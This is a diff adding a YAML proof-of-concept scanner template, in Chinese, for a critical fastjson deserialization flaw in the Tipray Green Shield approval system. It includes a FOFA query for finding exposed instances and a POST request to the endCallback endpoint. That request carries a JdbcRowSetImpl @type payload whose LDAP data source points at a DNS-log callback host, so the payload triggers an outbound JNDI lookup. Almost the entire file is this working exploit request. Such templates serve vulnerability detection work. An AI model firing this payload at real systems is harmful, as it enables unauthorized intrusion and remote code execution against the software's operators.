@@ -1,0 +1,32 @@
+id: poc-yaml-tipray-gsas-endcallback-fastjson-deserialization
+info:
+  name: 天锐绿盾审批系统 endCallback fastjson 反序列化漏洞
+  severity: critical
+  tags:
+  - 反序列化
+  - DNSLOG
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  random: random_str(6)
+requests:
+- method: POST
+  path: /trwfe/ws/taskCommon/endCallback
+  headers:
+    Content-Type: application/json
+  data: "{\n    \"workflowInstanceId\": \"any-non-empty-string\",\n    \"approval\"\
+    : \"true\",\n    \"data\": [\n        {\n            \"@type\": \"com.sun.rowset.JdbcRowSetImpl\"\
+    ,\n            \"dataSourceName\": \"ldap://{{.domain}}/{{.random}}\",\n     \
+    \       \"autoCommit\": true\n        }\n    ]\n}"
+  expression: 'status_code == 500 &&
+
+    contains(content_type,"text/html") &&
+
+    contains(body,"Internal Server Error") &&
+
+    reverse.Verify()
+
+    '
+transport: http
